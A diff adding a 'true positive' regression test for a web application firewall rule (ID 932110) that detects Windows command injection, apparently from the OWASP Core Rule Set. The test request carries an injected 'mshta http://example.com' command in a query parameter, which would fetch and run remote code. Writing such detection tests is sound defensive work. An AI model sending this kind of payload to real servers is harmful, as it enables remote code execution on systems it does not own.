@@ -39,3 +39,20 @@ tests:
             version: HTTP/1.0
           output:
             no_log_contains: id "932110"
+  - test_title: 932110-3
+    desc: "Windows Command Injection true positive test #2"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: "localhost"
+              User-Agent: "OWASP ModSecurity Core Rule Set"
+            method: GET
+            port: 80
+            # "cmd=;mshta http://example.com"
+            uri: /?cmd=mshta%20http://example.com
+            version: HTTP/1.0
+          output:
+            log_contains: id "932110"
